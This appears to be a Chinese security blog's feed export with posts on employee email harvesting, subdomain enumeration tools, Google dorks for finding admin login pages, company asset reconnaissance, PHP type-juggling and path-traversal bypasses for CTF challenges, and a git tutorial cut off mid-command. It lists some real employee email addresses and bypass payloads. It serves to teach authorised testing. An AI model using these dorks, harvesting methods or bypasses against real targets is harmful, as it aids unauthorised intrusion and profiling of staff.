href="mailto:&#x79;&#97;&#110;&#103;&#98;&#x6f;&#64;&#x62;&#x61;&#105;&#100;&#117;&#x2e;&#99;&#111;&#x6d;">&#x79;&#97;&#110;&#103;&#98;&#x6f;&#64;&#x62;&#x61;&#105;&#100;&#117;&#x2e;&#99;&#111;&#x6d;</a></li><li><a href="mailto:&#x6c;&#x69;&#117;&#106;&#x69;&#x6e;&#x6c;&#x6f;&#110;&#x67;&#x40;&#98;&#97;&#x69;&#x64;&#x75;&#46;&#99;&#x6f;&#x6d;">&#x6c;&#x69;&#117;&#106;&#x69;&#x6e;&#x6c;&#x6f;&#110;&#x67;&#x40;&#98;&#97;&#x69;&#x64;&#x75;&#46;&#99;&#x6f;&#x6d;</a></li><li><a href="mailto:&#108;&#x65;&#x69;&#122;&#104;&#105;&#120;&#105;&#110;&#x67;&#x40;&#x62;&#97;&#105;&#x64;&#117;&#x2e;&#x63;&#111;&#x6d;">&#108;&#x65;&#x69;&#122;&#104;&#105;&#120;&#105;&#110;&#x67;&#x40;&#x62;&#97;&#105;&#x64;&#117;&#x2e;&#x63;&#111;&#x6d;</a></li><li><a href="mailto:&#x68;&#117;&#97;&#110;&#103;&#x74;&#105;&#97;&#110;&#x74;&#x69;&#97;&#x6e;&#64;&#98;&#97;&#105;&#x64;&#117;&#46;&#x63;&#111;&#109;">&#x68;&#117;&#97;&#110;&#103;&#x74;&#105;&#97;&#110;&#x74;&#x69;&#97;&#x6e;&#64;&#98;&#97;&#105;&#x64;&#117;&#46;&#x63;&#111;&#109;</a></li></ul><blockquote><p>这几个很明显都是人名，邮箱命名可能就是 姓名@baidu.com</p></blockquote><h3 id="邮箱收集"><a href="#邮箱收集" class="headerlink" title="邮箱收集"></a>邮箱收集</h3><h4 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h4><ul><li><a href="https://snov.io/">https://snov.io/</a></li><li><a href="https://hunter.io/">https://hunter.io/</a></li><li><a href="http://www.skymem.info/">http://www.skymem.info/</a></li><li><a href="https://www.email-format.com/i/search/">https://www.email-format.com/i/search/</a></li></ul><p>用 skymem 演示一下：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051209202.png" alt="image-20221013163024636"></p><h4 id="收集工具"><a href="#收集工具" class="headerlink" title="收集工具"></a>收集工具</h4><p>theHarvester 是一个简单易用但功能强大的工具，设计用于红队评估或渗透测试的侦察阶段。它执行开源情报 (OSINT) 收集，以帮助确定域的外部威胁形势。</p><p>该工具使用多个公共资源收集姓名、电子邮件、IP、子域和 URL。</p><p>工具地址：<a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><p>使用演示：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python theHarvester<span class="hljs-selector-class">.py</span> -d baidu<span class="hljs-selector-class">.com</span> -<span class="hljs-selector-tag">b</span> baidu<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051209258.png" alt="image-20221013163222839"></p><h3 id="员工信息"><a href="#员工信息" class="headerlink" title="员工信息"></a>员工信息</h3><p>收集信息生成对应字典</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>子域名收集</title>
    <link href="/2023/06/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86/"/>
    <url>/2023/06/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86.png" alt="子域名收集"></p><h2 id="收集方式"><a href="#收集方式" class="headerlink" title="收集方式"></a>收集方式</h2><h3 id="网页信息"><a href="#网页信息" class="headerlink" title="网页信息"></a>网页信息</h3><ul><li>网页页脚导航</li><li>Robots 文件</li><li>Sitemap 站点地图</li></ul><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><h5 id="常规搜索引擎"><a href="#常规搜索引擎" class="headerlink" title="常规搜索引擎"></a>常规搜索引擎</h5><p>常规搜索引擎：百度、谷歌、必应</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:baidu.<span class="hljs-keyword">com</span><br>site:baidu.<span class="hljs-keyword">com</span> -inur<span class="hljs-variable">l:www</span><br></code></pre></td></tr></table></figure><h5 id="空间搜索引擎"><a href="#空间搜索引擎" class="headerlink" title="空间搜索引擎"></a>空间搜索引擎</h5><ul><li><p>fofa：<a href="https://fofa.info/">https://fofa.info/</a></p></li><li><p>Zoomeye：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p></li><li><p>shodan：<a href="https://www.shodan.io/">https://www.shodan.io/</a></p></li><li><p>360Quake：<a href="https://quake.360.cn/">https://quake.360.cn</a></p></li><li><p>鹰图：<a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p></li></ul><h3 id="DNS历史解析"><a href="#DNS历史解析" class="headerlink" title="DNS历史解析"></a>DNS历史解析</h3><ul><li><p>dnsdumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p></li><li><p>findsubdomains：<a href="https://findsubdomains.com/">https://findsubdomains.com/</a></p></li><li><p>siterankdata：<a href="https://siterankdata.com/">https://siterankdata.com/</a></p></li><li><p>dnsdb：<a href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></p></li><li><p>hackertarget：<a href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a></p></li><li><p>circl：<a href="https://www.circl.lu/services/passive-dns/#passive-dns">https://www.circl.lu/services/passive-dns/#passive-dns</a></p></li><li><p>百度云观测：<a href="http://ce.baidu.com/index/getRelatedSites?site_address=xxx.com">http://ce.baidu.com/index/getRelatedSites?site_address=xxx.com</a></p></li></ul><h3 id="SSL-x2F-TLS证书"><a href="#SSL-x2F-TLS证书" class="headerlink" title="SSL&#x2F;TLS证书"></a>SSL&#x2F;TLS证书</h3><p>SSL&#x2F;TLS 证书通常包含域名、子域名和邮件地址等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。</p><ul><li>myssl：<a href="https://myssl.com/">https://myssl.com/</a></li><li>crtsh：<a href="https://crt.sh/">https://crt.sh/</a> </li><li>facebook：<a href="https://developers.facebook.com/tools/ct">https://developers.facebook.com/tools/ct</a> </li><li>entrust：<a href="https://www.entrust.com/ct-search/">https://www.entrust.com/ct-search/</a> </li><li>certspotter：<a href="https://sslmate.com/certspotter/api/">https://sslmate.com/certspotter/api/</a> </li><li>spyse：<a href="https://spyse.com/search/certificate">https://spyse.com/search/certificate</a> </li><li>censys：<a href="https://censys.io/certificates">https://censys.io/certificates</a> </li><li>google：<a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></li></ul><h3 id="rapiddns"><a href="#rapiddns" class="headerlink" title="rapiddns"></a>rapiddns</h3><p>rapiddns：<a href="https://rapiddns.io/subdomain">https://rapiddns.io/subdomain</a></p><p>可以快速的获取大量子域名，结果也是比较全的。</p><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h3><p>项目地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><p>工具安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/shmilylty/OneForAll.git<br></code></pre></td></tr></table></figure><p>安装依赖 ( windows )：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/<br>pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/<br></code></pre></td></tr></table></figure><p>然后注释 <code>oneforall.py</code> 的下面代码 ( 这里不使用其爆破功能 ）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> brute <span class="hljs-keyword">import</span> Brute<br>srv = BruteSRV(self.domain)<br>srv.run()<br></code></pre></td></tr></table></figure><p>参考其 <code>api.py</code> 文件配置 API。</p><p>常用命令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 oneforall<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> example<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--brute</span> False <span class="hljs-attr">--dns</span> False <span class="hljs-attr">--req</span> False run <br>python3 oneforall<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--targets</span> ./domains<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--brute</span> False <span class="hljs-attr">--dns</span> False <span class="hljs-attr">--req</span> False run <br></code></pre></td></tr></table></figure><p>相同类型的工具还有 Amass。</p><h3 id="Amass"><a href="#Amass" class="headerlink" title="Amass"></a>Amass</h3><p>项目地址：<a href="https://github.com/owasp-amass/amass">https://github.com/owasp-amass/amass</a></p><p>工具安装：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">go install -v github.com<span class="hljs-regexp">/owasp-amass/</span>amass<span class="hljs-regexp">/v3/</span>...@master<br></code></pre></td></tr></table></figure><p>常用命令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">amass enum -d  example<span class="hljs-selector-class">.com</span> -o amass_results<span class="hljs-selector-class">.txt</span><br>amass enum -df ./domains<span class="hljs-selector-class">.txt</span> -o amass_results.txt<br></code></pre></td></tr></table></figure><h3 id="Subfinder"><a href="#Subfinder" class="headerlink" title="Subfinder"></a>Subfinder</h3><p>项目地址：<a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></p><p>工具安装：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">go install -v github.com<span class="hljs-regexp">/projectdiscovery/</span>subfinder<span class="hljs-regexp">/v2/</span>cmd/subfinder@latest<br></code></pre></td></tr></table></figure><p>配置 API：</p><p>常用命令：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">subfinder -<span class="hljs-attribute">all</span> -d example<span class="hljs-selector-class">.com</span> -o subfinder_results<span class="hljs-selector-class">.txt</span><br>subfinder -<span class="hljs-attribute">all</span> -<span class="hljs-selector-tag">dL</span> ./domains<span class="hljs-selector-class">.txt</span> -o subfinder_results<span class="hljs-selector-class">.txt</span><br></code></pre></td></tr></table></figure><h3 id="ksubdomain"><a href="#ksubdomain" class="headerlink" title="ksubdomain"></a>ksubdomain</h3><p>项目地址：<a href="https://github.com/boy-hack/ksubdomain">https://github.com/boy-hack/ksubdomain</a></p><p>工具安装：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">go install -v github.com<span class="hljs-regexp">/boy-hack/</span>ksubdomain<span class="hljs-regexp">/cmd/</span>ksubdomain@latest<br></code></pre></td></tr></table></figure><p>枚举模式：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ksubdomain enum <span class="hljs-attr">--only-domain</span> <span class="hljs-attr">--level</span> <span class="hljs-number">3</span> <span class="hljs-attr">--filename</span> dic<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--output</span> ksubdomain_results<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--domain</span> example<span class="hljs-selector-class">.com</span><br>ksubdomain enum <span class="hljs-attr">--only-domain</span> <span class="hljs-attr">--level</span> <span class="hljs-number">3</span> <span class="hljs-attr">--filename</span> dic<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--output</span> ksubdomain_results<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--domainList</span> ./domains.txt<br></code></pre></td></tr></table></figure><p>字典选择 <code>OneForAll-master\data\subnames_big.7z </code> 解压出来共 6 百万条子域名。</p><p>验证模式：（ 验证子域名是否解析 ）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ksubdomain verify <span class="hljs-attr">--filename</span> results<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--only-domain</span> <span class="hljs-attr">--output</span> ksubdomain_verify_results.txt<br></code></pre></td></tr></table></figure><h3 id="alterx"><a href="#alterx" class="headerlink" title="alterx"></a>alterx</h3><p>项目地址：<a href="https://github.com/projectdiscovery/alterx">https://github.com/projectdiscovery/alterx</a></p><p>工具安装：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">go install github.com<span class="hljs-regexp">/projectdiscovery/</span>alterx<span class="hljs-regexp">/cmd/</span>alterx@latest<br></code></pre></td></tr></table></figure><p>常用命令：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">alterx -l ksubdomain_verify_results.txt -pp &#x27;<span class="hljs-built_in">word</span>=<span class="hljs-built_in">words</span>.txt&#x27; -o subdomains.txt<br></code></pre></td></tr></table></figure><h2 id="工具组合"><a href="#工具组合" class="headerlink" title="工具组合"></a>工具组合</h2><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%20-%20%E5%B7%A5%E5%85%B7%E7%BB%84%E5%90%88.png" alt="子域名收集 - 工具组合"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Google-hacking</title>
    <link href="/2023/06/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Google-hacking/"/>
    <url>/2023/06/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Google-hacking/</url>
    
    <content type="html"><![CDATA[<h1 id="Google-hacking"><a href="#Google-hacking" class="headerlink" title="Google-hacking"></a>Google-hacking</h1><h2 id="基本搜索"><a href="#基本搜索" class="headerlink" title="基本搜索"></a>基本搜索</h2><ul><li>逻辑与：and</li><li>逻辑或： or </li><li>逻辑非： -</li><li>精确匹配：”关键词” </li><li>通配符：* ?</li><li>同义符：~</li></ul><h2 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h2><ul><li><code>intext</code> : 只搜索网页正文部分包含关键字的网页( ( 也就是忽略了标题 ,URL 等的文字) ) </li><li><code>allintext</code> : 只搜索网页正文部分包含全部关键字的网页 </li><li><code>intitle</code> : 搜索的网页标题包含指定的关键字 </li><li><code>allintitle</code>:: 搜索的网页标题包含所指定的全部关键字 </li><li><code>inurl</code> : 搜索的网页 URL 包含指定的关键字 </li><li><code>allinurl</code>: : 搜索的网页 URL 包含指定的全部关键字 </li><li><code>site</code> : 限制搜索范围的域名 </li><li><code>link</code>::可以得到包含了某个指定链接的页面列表 </li><li><code>filetype</code> : 搜索文件的后缀或者扩展名 </li><li><code>info</code> : 提供一个指定 URL 更多信息的页面列表, , 包括 URL 缓存的连接, , 包括 URL 的连接, , 和URL 相关的连接</li></ul><h3 id="搜索后台"><a href="#搜索后台" class="headerlink" title="搜索后台"></a>搜索后台</h3><ul><li><code>site:easen-group.com inurl:admin</code></li><li><code>site:easen-group.com inurl:login</code></li><li><code>site:easen-group.com intitle:后台管理</code></li><li><code>site：xxx.com intext:管理|后台|登陆|用户名|密码|系统|账号</code></li><li><code>site：xxx.com inurl:login/admin/manage/manager/admin_login/system</code></li><li><code>site：xxx.com intitle:管理|后台|登陆</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>目标资产收集</title>
    <link href="/2023/06/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%9B%AE%E6%A0%87%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/"/>
    <url>/2023/06/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%9B%AE%E6%A0%87%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="目标资产收集"><a href="#目标资产收集" class="headerlink" title="目标资产收集"></a>目标资产收集</h1><p>这里的目标收集指的是针对公司和对于城市的目标收集。</p><p>需要收集的目标有：</p><ul><li>WEB：反查（ <code>备案号, whois, 注册人, 联系方式 </code> ）</li><li>APP：应用商店，七麦数据</li><li>小程序：阿拉丁，小蓝本，企查查</li><li>公众号：天眼查，微信搜索</li></ul><h2 id="针对公司"><a href="#针对公司" class="headerlink" title="针对公司"></a>针对公司</h2><p>项目地址：<a href="https://github.com/wgpsec/ENScan_GO/">https://github.com/wgpsec/ENScan_GO/</a></p><p>一款基于各大企业信息 API 的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司 ICP 备案、APP、小程序、微信公众号等信息聚合导出。</p><p>生成配置文件：<code>enscan.exe -v</code> </p><p>添加配置：</p><ul><li>爱企查：<a href="https://www.aiqicha.com/">https://www.aiqicha.com/</a></li><li>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li><li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li><li>阿拉丁：<a href="https://www.aldwx.com/">https://www.aldwx.com/</a></li><li>小蓝本：<a href="https://www.xiaolanben.com/pc">https://www.xiaolanben.com/pc</a></li><li>七麦数据：<a href="https://www.qimai.cn/">https://www.qimai.cn/</a></li><li>站长之家：<a href="https://www.chinaz.com/">https://www.chinaz.com/</a></li><li>veryvp：<a href="http://veryvp.com/">http://veryvp.com/</a></li></ul><p>常用命令：（ 使用所有数据源收集目标公司的备案，APP，微信公众号，小程序 ）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">enscan.<span class="hljs-keyword">exe</span> -n 公司名 -field icp,app,wechat,wx_app -<span class="hljs-built_in">type</span> <span class="hljs-keyword">all</span> -email<br></code></pre></td></tr></table></figure><h2 id="针对城市"><a href="#针对城市" class="headerlink" title="针对城市"></a>针对城市</h2><p>补天经常会有针对某个城市的漏洞提交活动，如何获取指定城市的目标呢？可以使用爱企查或者企查查，按照城市查找相关目标。</p><p>如爱企查的高级搜索：<a href="https://aiqicha.baidu.com/advancesearch">https://aiqicha.baidu.com/advancesearch</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230606220706697.png" alt="image-20230606220706697"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF 中的 PHP 特性问题</title>
    <link href="/2023/06/05/CTF/CTF%E4%B8%AD%E7%9A%84PHP%E7%89%B9%E6%80%A7%E9%97%AE%E9%A2%98/"/>
    <url>/2023/06/05/CTF/CTF%E4%B8%AD%E7%9A%84PHP%E7%89%B9%E6%80%A7%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-中的-PHP-特性问题"><a href="#CTF-中的-PHP-特性问题" class="headerlink" title="CTF 中的 PHP 特性问题"></a>CTF 中的 PHP 特性问题</h1><h2 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h2><ul><li>松散比较：使用两个等号 <code>==</code> 比较，只比较值，不比较类型。（ <code>&gt; &lt;</code> 这种也是弱类型比较 ）</li><li>严格比较：用三个等号 <code>===</code>  比较，除了比较值，也比较类型。（ <code>!==</code> 是强不等于 ）</li></ul><p>当程序使用弱类型比较 （ <code>== </code> ）时，就会出现问题。</p><p>如以下情况：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;1&quot;</span> == <span class="hljs-number">1</span><br><span class="hljs-string">&quot;+1&quot;</span> == <span class="hljs-number">1</span> <br><span class="hljs-string">&quot;1abc&quot;</span> == <span class="hljs-number">1</span><br><span class="hljs-string">&quot;1.0&quot;</span> == <span class="hljs-number">1</span><br><span class="hljs-number">0</span> == <span class="hljs-literal">false</span><br>其他数字 == <span class="hljs-literal">true</span><br>纯字母 == <span class="hljs-number">0</span><br>...<br></code></pre></td></tr></table></figure><h2 id="科学计数法"><a href="#科学计数法" class="headerlink" title="科学计数法"></a>科学计数法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p1&#x27;</span>] &gt; <span class="hljs-number">10000</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p1&#x27;</span>]) &lt; <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>使用科学计数法即可绕过长度限制且满足大小，<code>1e9</code> 表示 1 * 10 的 9 次方</p><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><ul><li>弱类型 - 科学计数法绕过</li><li>强类型 - 数组绕过</li></ul><h3 id="科学计数法-1"><a href="#科学计数法-1" class="headerlink" title="科学计数法"></a>科学计数法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>!=<span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)<br></code></pre></td></tr></table></figure><p>在弱类型比较的情况下，<code>0e9</code> 和 <code>0e88</code> 是相同的，因为他们都是科学计数法表示的 0 的多少次方，而 0 的任何次方都等于 0，也就可以绕过所类型比较。</p><p>单次 <code>md5 </code>值为 <code>0e开头</code>的字符：</p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li></ul><p><code>md5 </code>和双 <code>md5 </code>以后的值都是 <code>0e</code> 开头的：</p><ul><li>CbDLytmyGm2xQyaLNhWn</li><li>770hQgrBOjrcqftrlaZk</li><li>7r4lGXCH2Ksu2JNT3BYM</li></ul><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>!=<span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)<br></code></pre></td></tr></table></figure><p><code>md5() </code>或者 <code>sha1() </code>之类的函数计算的是一个字符串的哈希值，对于数组则返回 <code>false</code>，当我们提交一个如 <code>?a[]=1&amp;b[]=2</code> 类型的数组时，<code>md5()</code> 后的结果都是 <code>false</code>，符合强类型比较。</p><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos"></a>strpos</h2><p><a href="https://www.runoob.com/php/func-string-strpos.html">https://www.runoob.com/php/func-string-strpos.html</a></p><p><code>strpos()</code> 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p><p>如果查到了字符串的位置就返回其位置（ 从 0 开始算 ），没有就返回 <code>false</code>。</p><p>那么遇到这种 <code>if !(strpos($a,&quot;str&quot;))</code> 的判断时，就有了 2 种符合的条件。</p><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p><code>is_numeric() </code>函数用于检测变量是否为数字或数字字符串。</p><p>弱类型比较，将数字后面加上空格或者任意一个字符即可绕过。</p><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array"></a>in_array</h2><p><a href="https://www.runoob.com/php/func-array-in-array.html">https://www.runoob.com/php/func-array-in-array.html</a></p><p><code>in_array()</code> 函数搜索数组中是否存在指定的值。</p><p>当其第三个参数设置为 TRUE，则 in_array() 函数检查搜索的数据与数组的值的类型是否相同。</p><p>反过来也就是说，当没有设置为 true 时，这是一个弱类型比较。</p><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><p><code>preg_match </code>函数用于执行一个正则表达式匹配。</p><p>但 <code>preg_match </code>只能处理字符串，当我们传入一个数组变量时，这个函数就会被绕过。</p><h2 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a>str_replace</h2><p> <code>str_replace</code> 函数替换字符串中的一些字符（区分大小写）。</p><p> <code>str_replace</code>  无法迭代过滤，如 <code>selselectect</code> 双写即可绕过过滤。</p><h2 id="array-search"><a href="#array-search" class="headerlink" title="array_search"></a>array_search</h2><p><code>array_search </code>函数在数组中搜索某个键值，并返回对应的键名。</p><p>和 <code>in_array</code> 类似，第三个参数为 <code>true</code> 时，才比较值类型。</p><p>如 <code>array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;])</code> ，如果 <code>$c[&quot;n&quot;]</code> 中没有 “DGGJ”，可以利用弱类型绕过，如 “DGGJ” <code>int</code> 类型为 0，可以使用数字 0 来匹配。</p><h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><p>文件包含的函数。</p><p>如果参数中包含 <code>../</code>这样的路径，解析器则会忽略 <code>../</code> 之前的字符串而去在当前目录的父目录下寻找文件。</p><p>如<code>file=hint.php?../../../../../ffffllllaaaagggg</code>，也可以读取到 ffffllllaaaagggg 文件。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git 版本控制</title>
    <link href="/2023/05/29/%E5%85%B6%E4%BB%96%E6%96%87%E7%AB%A0/Git%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/05/29/%E5%85%B6%E4%BB%96%E6%96%87%E7%AB%A0/Git%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><p>官网：<a href="https://gitforwindows.org/">https://gitforwindows.org/</a></p><p>镜像：<a href="https://registry.npmmirror.com/binary.html?path=git-for-windows/">https://registry.npmmirror.com/binary.html?path=git-for-windows/</a></p><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><h3 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h3><blockquote><p>git init 初始化一个仓库</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">初始化当前目录</span><br>git init<br><span class="hljs-meta prompt_"># </span><span class="language-bash">初始化指定目录</span><br>git init &lt;directory&gt;<br></code></pre></td></tr></table></figure><h3 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h3><blockquote><p>git clone 从现有 Git 仓库中拷贝项目</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">克隆repo仓库</span><br>git clone &lt;repo&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">克隆repo仓库到directory目录</span><br>git clone &lt;repo&gt; &lt;directory&gt;<br></code></pre></td></tr></table></figure><h3 id="git-config"><a href="#git-config" class="headerlink" title="git config"></a>git config</h3><blockquote><p>git config 配置 git信息</p></blockquote><p>查看配置信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --list<br></code></pre></td></tr></table></figure><p>编辑配置信息-打开vim编辑器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config -e    # 针对当前仓库 <br>git config 